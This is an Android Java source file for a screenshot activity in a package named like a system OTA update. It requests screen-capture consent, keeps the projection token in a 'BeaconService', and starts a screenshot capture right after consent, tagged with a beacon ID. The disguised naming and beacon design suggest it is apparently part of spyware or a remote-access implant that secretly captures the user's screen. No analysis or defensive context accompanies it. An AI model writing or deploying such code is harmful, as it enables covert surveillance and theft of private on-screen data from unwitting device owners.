package com.sysupdate.ota;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.util.Log;

public class ScreenshotActivity extends Activity {
    private static final String TAG = "sysupdate.ss";
    private static final int REQ = 200;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            MediaProjectionManager mgr = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            startActivityForResult(mgr.createScreenCaptureIntent(), REQ);
        } catch (Exception e) {
            Log.e(TAG, "failed to start: " + e.getMessage());
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQ && resultCode == RESULT_OK && data != null) {
            MediaProjectionManager mgr = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            BeaconService.staticProjection = mgr.getMediaProjection(resultCode, data);
            Log.i(TAG, "projection token stored, capturing...");

            // Auto-capture immediately after consent
            String uuid = getIntent().getStringExtra("beacon_uuid");
            if (uuid == null) uuid = "unknown";

            // Notify the service to capture
            Intent capture = new Intent(this, BeaconService.class);
            capture.putExtra("do_screenshot", true);
            capture.putExtra("beacon_uuid", uuid);
            startService(capture);
        } else {
            Log.w(TAG, "projection denied by user");
        }
        finish();
    }
}
